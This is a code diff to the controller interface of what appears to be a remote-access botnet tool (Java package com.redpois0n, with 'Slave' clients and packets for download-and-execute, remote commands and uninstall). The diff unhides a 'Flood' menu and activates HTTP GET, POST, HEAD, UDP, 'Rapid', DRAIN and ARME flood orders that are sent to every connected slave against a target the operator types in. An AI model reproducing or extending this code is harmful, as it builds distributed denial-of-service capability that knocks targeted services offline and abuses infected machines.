@@ -50,6 +50,7 @@ import com.redpois0n.Help;
 import com.redpois0n.Main;
 import com.redpois0n.SampleMode;
 import com.redpois0n.Slave;
+import com.redpois0n.common.Flood;
 import com.redpois0n.common.Version;
 import com.redpois0n.events.Event;
 import com.redpois0n.events.Events;
@@ -59,6 +60,7 @@ import com.redpois0n.packets.outgoing.Packet11Disconnect;
 import com.redpois0n.packets.outgoing.Packet14VisitURL;
 import com.redpois0n.packets.outgoing.Packet17DownloadExecute;
 import com.redpois0n.packets.outgoing.Packet18Update;
+import com.redpois0n.packets.outgoing.Packet22Flood;
 import com.redpois0n.packets.outgoing.Packet36Uninstall;
 import com.redpois0n.packets.outgoing.Packet37RestartJavaProcess;
 import com.redpois0n.packets.outgoing.Packet38RunCommand;
@@ -1094,7 +1096,6 @@ public class Frame extends BaseFrame {
 		popupMenu.add(mntmUpdateFromUrl);
 
 		JMenu mnFlood = new JMenu("Flood");
-		mnFlood.setVisible(false);
 		mnFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/flood.png")));
 		popupMenu.add(mnFlood);
 
@@ -1118,7 +1119,7 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_HTTP_GET, new String[] { !target.startsWith("http://") ? "http://" + target : target, time1 + "" }));
+						sl.addToSendQueue(new Packet22Flood(Flood.GET, target, time1));
 					}
 				}
 			}
@@ -1154,7 +1155,7 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_UDP, new String[] { target, time1 + "" }));
+						sl.addToSendQueue(new Packet22Flood(Flood.UDP, target, time1));
 					}
 				}
 			}
@@ -1181,7 +1182,7 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_HTTP_POST, new String[] { target, time1 + "" }));
+						sl.addToSendQueue(new Packet22Flood(Flood.POST, target, time1));
 					}
 				}
 			}
@@ -1211,7 +1212,7 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_HTTP_HEAD, new String[] { target, time1 + "" } ));
+						sl.addToSendQueue(new Packet22Flood(Flood.HEAD, target, time1));
 					}
 				}
 			}
@@ -1220,7 +1221,7 @@ public class Frame extends BaseFrame {
 		mntmUdpFlood.setIcon(new ImageIcon(Frame.class.getResource("/icons/udp_flood.png")));
 		mnFlood.add(mntmUdpFlood);
 
-		JMenuItem mntmSsynFlood = new JMenuItem("SYN flood");
+		JMenuItem mntmSsynFlood = new JMenuItem("Rapid flood");
 		mntmSsynFlood.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				String target = Util.showDialog("SSYN flood", "Enter website URL to flood");
@@ -1242,7 +1243,7 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_SSYN, new String[] { target, time1 + "" }));
+						sl.addToSendQueue(new Packet22Flood(Flood.RAPID, target, time1));
 					}
 				}
 			}
@@ -1271,7 +1272,7 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_DRAIN, new String[] { target, time1 + "" } ));
+						sl.addToSendQueue(new Packet22Flood(Flood.DRAIN, target, time1));
 					}
 				}
 			}
@@ -1307,7 +1308,7 @@ public class Frame extends BaseFrame {
 				List<Slave> servers = Util.getSlaves();
 				if (servers.size() > 0) {
 					for (Slave sl : servers) {
-						// TODO sl.addToSendQueue(new PacketBuilder(Header.FLOOD_ARME, new String[] { target, time1 + "" } ));
+						sl.addToSendQueue(new Packet22Flood(Flood.ARME, target, time1));
 					}
 				}
 			}
